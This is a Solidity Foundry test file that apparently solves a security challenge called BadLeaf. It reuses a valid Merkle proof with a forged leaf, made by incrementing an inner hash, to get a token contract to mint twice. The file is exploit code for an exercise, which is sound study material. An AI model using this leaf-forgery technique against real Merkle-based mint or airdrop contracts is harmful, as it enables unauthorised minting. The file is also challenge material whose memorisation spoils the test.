// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test, console2} from "forge-std/Test.sol";
import {BadLeafBaseTest} from "./BadLeafBase.t.sol";

contract BadLeafTest is BadLeafBaseTest {
    function testExploit() external validation {
        // Step 1: Use the known valid leaf and proof for user0
        bytes32 validLeaf = token.getLeafNode(user0, 5);
        bytes32[] memory validProof = new bytes32[](2);
        validProof[0] = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
        validProof[1] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;

        // Step 2: Call verify with the valid leaf and proof
        token.verify(validProof, validLeaf);

        // Step 3: Generate a new leaf by manipulating the inner hash
        bytes32 innerHash = keccak256(abi.encode(user0, 5));
        bytes32 newInnerHash = bytes32(uint256(innerHash) + 1);
        bytes32 newLeaf = keccak256(bytes.concat(newInnerHash));

        // Step 4: Call verify again with the new leaf and the same proof
        token.verify(validProof, newLeaf);

        // The validation modifier will check if we have minted 2 NFTs to this contract
    }
}